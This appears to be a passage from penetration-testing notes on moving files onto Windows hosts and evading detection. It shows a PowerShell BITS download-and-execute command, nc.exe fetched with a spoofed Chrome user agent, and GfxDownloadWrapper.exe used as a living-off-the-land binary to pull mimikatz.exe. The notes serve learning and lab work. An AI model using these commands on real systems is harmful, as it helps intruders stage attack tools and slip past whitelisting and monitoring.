__BITS - Client__ 
```
Import-Module bitstransfer;
Start-BitsTransfer 'http://10.10.10.32/nc.exe' $env:temp\t;
$r=gc $env:temp\t;
rm $env:temp\t; 
iex $r
```
![image](https://github.com/user-attachments/assets/10fbb800-5c31-462f-9a27-934c6ea14121)

# Evading Detection

## Changing User Agents 
Invoke-WebRequest in PowerShell has a UserAgent parameter that allows changing the default user agent to emulate browsers like Internet Explorer, Firefox, or Chrome. If administrators have blacklisted certain user agents, setting the user agent to a commonly used one (e.g., Chrome) can make the request appear legitimate and bypass detection.

__Listing out User Agents__ (windows)
```
[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl
```
Invoking Invoke-WebRequest to download nc.exe using a Chrome User Agent:

__Request with Chrome User Agent__
```
$UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
```
![image](https://github.com/user-attachments/assets/2e79ab38-3d73-41bc-929a-ceb94d644b4f)

## LOLBAS / GTFOBins
Application whitelisting may block PowerShell or Netcat, and command-line logging can alert defenders. A way around this is using LOLBINs (living off the land binaries), which are trusted system binaries with exploitable functionality. For example, Intel's GfxDownloadWrapper.exe on Windows 10 can be used to download configuration files, allowing attackers to leverage its functionality without raising suspicion.

__Transferring File with GfxDownloadWrapper.exe__
```
GfxDownloadWrapper.exe "http://10.10.10.132/mimikatz.exe" "C:\Temp\nc.exe"
```
Such a binary might be permitted to run by application whitelisting and be excluded from alerting. Other, more commonly available binaries are also available, and it is worth checking the [LOLBAS](https://lolbas-project.github.io/) project to find a suitable "file download" binary that exists in your environment. Linux's equivalent is the [GTFOBins project](https://gtfobins.github.io/) and is definitely also worth checking out. 


